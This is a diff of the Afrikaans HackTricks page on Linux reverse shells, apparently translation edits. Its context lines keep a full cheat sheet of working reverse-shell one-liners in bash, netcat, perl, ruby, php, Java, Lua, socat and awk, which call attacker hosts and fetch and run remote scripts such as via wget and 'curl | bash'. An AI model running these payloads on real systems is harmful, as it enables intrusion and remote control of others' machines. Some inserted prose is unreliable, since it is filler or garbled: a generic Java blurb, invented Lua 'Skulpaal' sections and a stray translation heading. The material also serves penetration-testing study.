@@ -8,7 +8,7 @@ Ander maniere om HackTricks te ondersteun:
 
 * As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
@@ -16,7 +16,7 @@ Ander maniere om HackTricks te ondersteun:
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -55,10 +55,12 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 #### Skulverduideliking
 
 1. **`bash -i`**: Hierdie deel van die bevel begin 'n interaktiewe (`-i`) Bash-skul.
-2. **`>&`**: Hierdie deel van die bevel is 'n kort notasie vir **omleiding van beide standaard uitvoer** (`stdout`) en **standaard fout** (`stderr`) na dieselfde bestemming.
+2. **`>&`**: Hierdie deel van die bevel is 'n kort notasie vir die **omleiding van beide standaard uitvoer** (`stdout`) en **standaard fout** (`stderr`) na dieselfde bestemming.
 3. **`/dev/tcp/<AANVALLER-IP>/<POORT>`**: Dit is 'n spesiale lêer wat 'n TCP-verbinding met die gespesifiseerde IP-adres en poort **voorstel**.
 * Deur **die uitset- en foutstrome na hierdie lêer om te lei**, stuur die bevel effektief die uitset van die interaktiewe skul-sessie na die aanvaller se masjien.
 4. **`0>&1`**: Hierdie deel van die bevel **lei standaard inset (`stdin`) om na dieselfde bestemming as standaard uitvoer (`stdout`)**.
+
+### Skep in lêer en voer uit
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
@@ -67,7 +69,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 
 Wanneer daar 'n **Remote Code Execution (RCE)** kwesbaarheid binne 'n Linux-gebaseerde webtoepassing hanteer word, kan die bereiking van 'n omgekeerde skul belemmer word deur netwerkverdedigings soos iptables-reëls of ingewikkelde pakketfilteringsmeganismes. In sulke beperkte omgewings behels 'n alternatiewe benadering die vestiging van 'n PTY (Pseudo Terminal) skul om meer doeltreffend met die gekompromitteerde stelsel te kan interaksieer.
 
-'n Aanbevole gereedskap vir hierdie doel is [toboggan](https://github.com/n3rada/toboggan.git), wat die interaksie met die teikenumgewing vereenvoudig.
+'n Aanbevole instrument vir hierdie doel is [toboggan](https://github.com/n3rada/toboggan.git), wat die interaksie met die teikenumgewing vereenvoudig.
 
 Om toboggan doeltreffend te benut, skep 'n Python-module wat toegespits is op die RCE-konteks van jou teikenstelsel. Byvoorbeeld, 'n module genaamd `nix.py` kan as volg gestruktureer word:
 ```python3
@@ -97,10 +99,9 @@ En dan kan jy hardloop:
 ```shell
 toboggan -m nix.py -i
 ```
-Om direk 'n interaktiewe dop te benut, kan jy `-b` byvoeg vir Burpsuite-integrasie en die `-i` verwyder vir 'n meer basiese rce-omhulsel.
+Om direk 'n interaktiewe dop te benut. Jy kan `-b` byvoeg vir Burpsuite-integrasie en die `-i` verwyder vir 'n meer basiese rce-omslag.
 
-
-'n Ander moontlikheid is om die `IppSec` deurverwysdop-implementering te gebruik [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+'n Ander moontlikheid is om die `IppSec` forward shell-implementering te gebruik [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 Jy hoef net te wysig:
 
@@ -108,7 +109,7 @@ Jy hoef net te wysig:
 * Die voorvoegsel en agtervoegsel van jou lading (indien enige)
 * Die manier waarop die lading gestuur word (koppe? data? ekstra inligting?)
 
-Daarna kan jy net **bevele stuur** of selfs die `upgrade`-bevel **gebruik om 'n volledige PTY te kry** (let daarop dat pype met 'n benaderde vertraging van 1.3s gelees en geskryf word).
+Daarna kan jy net **bevele stuur** of selfs die `upgrade` bevel gebruik om 'n volledige PTY te kry (let daarop dat pype met 'n benaderde vertraging van 1.3s gelees en geskryf word).
 
 ## Netcat
 ```bash
@@ -120,7 +121,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## gsocket
 
-Kyk dit na op [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
+Kyk dit na by [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -157,6 +158,8 @@ perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getpro
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
+
+### Afrikaans Translation
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -174,6 +177,8 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
 ## Java
+
+Java is 'n programmeertaal wat algemeen gebruik word vir die ontwikkeling van programme en toepassings wat op verskeie platforms kan hardloop. Dit is 'n objek-georiënteerde taal wat baie gewild is vir die ontwikkeling van groot sagtewareprojekte. Java-kode word gewoonlik in platte tekst lêers geskryf met die `.java` lêeruitbreiding. Die kode word dan deur 'n Java-kompilator vertaal na masjienkode wat deur 'n Java virtuele masjien (JVM) uitgevoer kan word.
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -190,7 +195,21 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 ```
 ## Lua
 
-Lua is 'n kragtige, effektiewe, ligte, en uitbreibare skrips taal wat dikwels gebruik word in die wêreld van hacking. Dit bied 'n eenvoudige sintaksis en is maklik om te leer en te gebruik vir verskeie hacking take. Lua kan gebruik word vir die skryf van skadelike skrifte, bots, en selfs vir die ontwikkeling van hacking tools en programme.
+### Inleiding
+
+Lua is 'n kragtige, effektiewe, klein, en aanpasbare skriptaal wat dikwels gebruik word in die wêreld van sagteware-ontwikkeling. Dit word dikwels gebruik vir die skryf van skripte, konfigurasie, en selfs vir die ontwikkeling van volwaardige sagteware-toepassings. Lua is bekend vir sy vinnige uitvoering en klein geheue-afdruk, wat dit 'n gewilde keuse maak vir verskeie toepassings.
+
+### Lua Skulpaal
+
+Lua-skulpaal is 'n kragtige tegniek wat gebruik word om Lua-skripte uit te voer binne 'n ander program of toepassing. Dit bied die vermoë om dinamies Lua-kode te laai en uit te voer tydens die uitvoering van 'n program. Hierdie tegniek is baie nuttig vir die aanpassing en uitbreiding van sagteware sonder om die bronkode te wysig.
+
+### Lua Skulpaal in Linux
+
+In Linux-omgewings kan Lua-skulpaal gebruik word om sagteware aan te pas, sagteware-uitbreidings te skep, en selfs om sagteware te manipuleer vir spesifieke doeleindes. Dit bied 'n kragtige manier om die funksionaliteit van sagteware uit te brei sonder om die oorspronklike bronkode te wysig. Met Lua-skulpaal kan gebruikers sagteware aanpas en verbeter sonder om diep in die sagteware se interne werking in te gryp.
+
+### Lua Skulpaal Vir Hacking
+
+Vir hackers kan Lua-skulpaal 'n nuttige tegniek wees om sagteware te manipuleer vir hul eie doeleindes. Deur Lua-skripte te gebruik, kan hackers sagteware aanpas, funksionaliteit uitbrei, en selfs nuwe funksies byvoeg sonder om die oorspronklike bronkode te wysig. Hierdie maak dit moontlik vir hackers om sagteware aan te pas vir spioenasie, datakaping, en selfs vir die uitvoering van skadelike aksies sonder om opgespoor te word.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -271,6 +290,8 @@ attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
+
+Awk is 'n kragtige patroonherkenningstaal wat dikwels gebruik word vir die manipulasie van data en die skep van rapporte. Dit kan ook gebruik word as 'n skulpskakel in Linux om data te verwerk en te manipuleer.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -290,9 +311,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ```
 ## Gawk
 
-### Gawk
-
-Gawk is a powerful programming language that is particularly useful for handling data extraction and reporting tasks. It is often used in combination with other Linux tools to process and manipulate text files effectively. Gawk provides a wide range of features for pattern scanning and processing, making it a versatile tool for data analysis and manipulation.
+Gawk is 'n kragtige patroonvergelyking en verwerkingsprogram wat dikwels gebruik word vir data-manipulasie en tekstverwerking.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -344,22 +363,22 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-**Probeer Hard Security Group**
+**Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
